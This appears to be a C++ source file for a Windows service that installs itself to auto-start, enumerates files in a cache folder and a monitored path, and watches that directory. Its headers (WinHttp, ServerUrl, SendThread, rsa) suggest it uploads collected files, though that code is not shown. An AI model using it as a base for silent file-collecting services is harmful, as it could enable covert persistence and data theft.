#include "PassX.h"
#include "WatchDirectory.h"
#include "EnumDirectoryFile.h"
#include "WinHttp.h"
#include "ServerUrl.h"
#include "Utils.h"
#include "SendThread.h"
#include "rsa.h"
#include "Service.h"

SERVICE_STATUS_HANDLE hServiceStatus;
SERVICE_STATUS status;
ULONG g_ulThreadID;

void Init()
{
	hServiceStatus = NULL;
	status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	status.dwCurrentState = SERVICE_STOPPED;
	status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	status.dwWin32ExitCode = 0;
	status.dwServiceSpecificExitCode = 0;
	status.dwCheckPoint = 0;
	status.dwWaitHint = 0;
}
void WINAPI ServiceStrl(DWORD dwOpcode)
{
	switch (dwOpcode)
	{
	case SERVICE_CONTROL_STOP:
		status.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hServiceStatus,&status);
		PostThreadMessage(g_ulThreadID,WM_CLOSE,0,0);
		break;
	case SERVICE_CONTROL_PAUSE:
		break;
	case SERVICE_CONTROL_CONTINUE:
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		break;
	default:
		OutputDebugString(L"Bad service request");
	}
}
void WINAPI ServiceMain()
{
	WCHAR wCachePath[MAX_PATH];
	HANDLE hSendCache,hFindFileThread,hMonitorDir;

	status.dwCurrentState = SERVICE_START_PENDING;
	status.dwControlsAccepted = SERVICE_ACCEPT_STOP;//这个要使用，否则你不能控制

	hServiceStatus = RegisterServiceCtrlHandler(SERVICE_NAME,ServiceStrl);
	if (hServiceStatus == NULL)
	{
		return;
	}
	SetServiceStatus(hServiceStatus,&status);

	status.dwWin32ExitCode = S_OK;
	status.dwCheckPoint = 0;
	status.dwWaitHint = 0;
	status.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(hServiceStatus,&status); 

	//模拟服务的运行，10后自动退出。应用时将主要任务放于此即可
	//int i = 0;
	//while (i < 10)
	//{
	//	Sleep(1000);
	//	i++;
	//}
	//

	InitializeGlobalDat();
	InitializeList();

	RtlZeroMemory(wCachePath,sizeof(WCHAR) * MAX_PATH);
	GetCurrentDirectory(MAX_PATH,wCachePath);
	StringCchCatW(wCachePath,MAX_PATH,L"\\Cache");
	hSendCache = CreateThread(NULL,0,DoFindAllFile,wCachePath,NULL,0);
	if (NULL == hSendCache)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hSendCache,INFINITE);
	hFindFileThread = CreateThread(NULL,0,DoFindAllFile,g_wMonitorPath,NULL,0);
	if (NULL == hFindFileThread)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hFindFileThread,INFINITE);
	hMonitorDir = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MonitorDir,NULL,NULL,NULL);
	if (!hMonitorDir)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hMonitorDir,INFINITE);

	status.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(hServiceStatus,&status);
}
BOOLEAN IsInstalled(WCHAR *wServiceName)
{
	BOOL bResult = FALSE;
	SC_HANDLE hSCM = ::OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (hSCM != NULL)
	{
		SC_HANDLE hService = ::OpenService(hSCM,wServiceName,SERVICE_QUERY_CONFIG);
		if (hService != NULL)
		{
			bResult = TRUE;
			::CloseServiceHandle(hService);
		}
		::CloseServiceHandle(hSCM);
	}
	return bResult;
}
BOOLEAN Uninstall(WCHAR *wServiceName)
{
	SC_HANDLE hScManager;
	SC_HANDLE hScService;
	SERVICE_STATUS status;
	hScManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (NULL == hScManager)
	{
		return FALSE;
	}

	hScService = OpenService(hScManager,wServiceName,SERVICE_STOP | DELETE);
	if (hScService)
	{
		ControlService(hScService,SERVICE_CONTROL_STOP,&status);
		DeleteService(hScService);
		return TRUE;
	}
	return FALSE;
}
BOOLEAN Install(WCHAR *wServiceName,WCHAR *wShowName,WCHAR *ServicePath,WCHAR *wDependencies)
{
	SC_HANDLE hScManager;
	SC_HANDLE hScService;
	ULONG_PTR ulError;

	hScManager = OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ALL_ACCESS);
	if (NULL == hScManager)
	{
		ulError = GetLastError();
		return FALSE;
	}
	hScService = CreateService(hScManager, \
		wServiceName, \
		wShowName, \
		SC_MANAGER_ALL_ACCESS, \
		SERVICE_WIN32_OWN_PROCESS, \
		SERVICE_AUTO_START, \
		SERVICE_ERROR_NORMAL, \
		ServicePath, \
		NULL, \
		NULL, \
		NULL, \
		NULL, \
		NULL);
	if (hScService == NULL)
	{
		CloseServiceHandle(hScManager);
		ulError = GetLastError();
		return FALSE;
	}
	CloseServiceHandle(hScManager);
	CloseServiceHandle(hScService);
	return TRUE;
}
//HANDLE MyOpenService(WCHAR *wServiceName,WCHAR *wShowName,WCHAR *ServicePath,WCHAR *wDependencies)
//{
//	SC_HANDLE hScManager;
//	SC_HANDLE hScService;
//	ULONG_PTR ulError;
//
//	hScManager = OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ALL_ACCESS);
//	if (NULL == hScManager)
//	{
//		ulError = GetLastError();
//		return NULL;
//	}
//	hScService = OpenService(hScManager,wServiceName,SC_MANAGER_ALL_ACCESS);
//	if (NULL == hScService)
//	{
//		ulError = GetLastError();
//		if (ulError == ERROR_SERVICE_DOES_NOT_EXIST)
//		{
//			if (Install(wShowName,wShowName,ServicePath,wDependencies))
//			{
//				hScService = OpenService(hScManager,wServiceName,SC_MANAGER_ALL_ACCESS);
//			}
//		}
//	}
//	if (hScService)
//	{
//		StartService(hScService,)
//	}
//}